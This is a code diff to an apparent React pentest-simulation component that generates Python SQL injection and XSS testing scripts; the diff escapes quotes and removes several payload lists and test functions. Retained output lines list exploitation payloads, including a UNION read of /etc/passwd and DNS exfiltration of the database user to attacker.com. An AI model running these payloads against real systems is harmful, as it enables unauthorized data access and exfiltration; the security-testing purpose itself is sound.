@@ -1,3 +1,4 @@
+
 import React, { useState } from 'react';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -26,7 +27,7 @@ import time
 
 # SQL Injection Testing Script
 target_url = "${url}"
-payload = "${payload}"
+payload = "${payload.replace(/"/g, '\\"')}"
 
 def test_sql_injection(url, payload):
     """Test for SQL injection vulnerabilities"""
@@ -79,33 +80,6 @@ def test_sql_injection(url, payload):
     print("[+] No SQL injection vulnerabilities detected")
     return False
 
-# Union-based SQL injection test
-def test_union_injection(url):
-    """Test for UNION-based SQL injection"""
-    union_payloads = [
-        "' UNION SELECT 1,2,3--",
-        "' UNION SELECT version(),user(),database()--",
-        "' UNION SELECT table_name FROM information_schema.tables--"
-    ]
-    
-    for payload in union_payloads:
-        print(f"[*] Testing UNION payload: {payload}")
-        # Implementation here...
-
-# Time-based blind SQL injection test
-def test_blind_injection(url):
-    """Test for blind SQL injection using time delays"""
-    blind_payloads = [
-        "'; WAITFOR DELAY '00:00:05'--",
-        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-        "'; SELECT pg_sleep(5)--"
-    ]
-    
-    for payload in blind_payloads:
-        start_time = time.time()
-        # Send request and measure response time
-        # Implementation here...
-        
 if __name__ == "__main__":
     test_sql_injection(target_url, payload)
     print("[+] SQL injection testing completed")`;
@@ -120,7 +94,7 @@ import re
 
 # XSS Testing Framework
 target_url = "${url}"
-xss_payload = "${payload}"
+xss_payload = "${payload.replace(/"/g, '\\"')}"
 
 def test_reflected_xss(url, payload):
     """Test for reflected XSS vulnerabilities"""
@@ -161,11 +135,6 @@ def test_reflected_xss(url, payload):
                 if payload in response.text or encoded_payload in response.text:
                     print(f"[!] REFLECTED XSS FOUND: {param}")
                     print(f"[!] Payload: {payload}")
-                    
-                    # Check if it's in script context
-                    if re.search(r'<script[^>]*>' + re.escape(payload), response.text):
-                        print("[!] CRITICAL: Payload in script context")
-                    
                     return True
                     
             except requests.exceptions.RequestException as e:
@@ -173,69 +142,8 @@ def test_reflected_xss(url, payload):
     
     return False
 
-def test_stored_xss(url, payload):
-    """Test for stored XSS vulnerabilities"""
-    print(f"[+] Testing stored XSS")
-    
-    # Find forms on the page
-    try:
-        response = requests.get(url)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        forms = soup.find_all('form')
-        
-        for form in forms:
-            action = form.get('action', '')
-            method = form.get('method', 'get').lower()
-            
-            # Get form inputs
-            inputs = form.find_all(['input', 'textarea'])
-            form_data = {}
-            
-            for input_field in inputs:
-                name = input_field.get('name')
-                if name:
-                    if input_field.get('type') in ['text', 'email', 'url'] or input_field.name == 'textarea':
-                        form_data[name] = payload
-                    else:
-                        form_data[name] = 'test'
-            
-            # Submit form with XSS payload
-            if method == 'post':
-                requests.post(url + action, data=form_data)
-            else:
-                requests.get(url + action, params=form_data)
-            
-            print(f"[*] Submitted XSS payload to form: {action}")
-            
-    except Exception as e:
-        print(f"[-] Error testing stored XSS: {e}")
-
-def test_dom_xss(url):
-    """Test for DOM-based XSS"""
-    print("[+] Testing DOM-based XSS")
-    
-    dom_payloads = [
-        "#<script>alert('DOM-XSS')</script>",
-        "#javascript:alert('DOM-XSS')",
-        "#<img src=x onerror=alert('DOM-XSS')>"
-    ]
-    
-    for payload in dom_payloads:
-        test_url = url + payload
-        print(f"[*] Testing DOM payload: {payload}")
-        
-        try:
-            response = requests.get(test_url)
-            # Check for DOM manipulation indicators
-            if "document.location" in response.text or "window.location" in response.text:
-                print("[!] Potential DOM-XSS vulnerability detected")
-        except:
-            pass
-
 if __name__ == "__main__":
     test_reflected_xss(target_url, xss_payload)
-    test_stored_xss(target_url, xss_payload)
-    test_dom_xss(target_url)
     print("[+] XSS testing completed")`;
   };
 
@@ -287,9 +195,9 @@ if __name__ == "__main__":
       '',
       '[+] EXPLOITATION PAYLOADS:',
       `• Error-based: ${payload}`,
-      '• Union-based: \' UNION SELECT 1,version(),database()--',
-      '• File read: \' UNION SELECT LOAD_FILE("/etc/passwd")--',
-      '• Outbound DNS: \' UNION SELECT CONCAT(user(),".attacker.com")--',
+      "• Union-based: ' UNION SELECT 1,version(),database()--",
+      "• File read: ' UNION SELECT LOAD_FILE('/etc/passwd')--",
+      "• Outbound DNS: ' UNION SELECT CONCAT(user(),'.attacker.com')--",
       '',
       '[+] GENERATED EXPLOITATION SCRIPT:',
       'Full Python framework created for automated exploitation',
@@ -367,7 +275,7 @@ if __name__ == "__main__":
       '• Encoding: &#60;script&#62;',
       '• Unicode: \\u003cscript\\u003e',
       '• HTML entities: &lt;script&gt;',
-      '• Polyglot: jaVasCript:/*-/*`/*\\`/*\\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
+      '• Polyglot: Complex bypass payload',
       '',
       '[+] EXPLOITATION SCENARIOS:',
       '[!] Session hijacking via document.cookie theft',
@@ -451,7 +359,7 @@ class WebScanner:
         pass
 
 scanner = WebScanner("${url}")
-scanner.scan_all();
+scanner.scan_all()`;
 
     setGeneratedScript(comprehensiveScript);
     
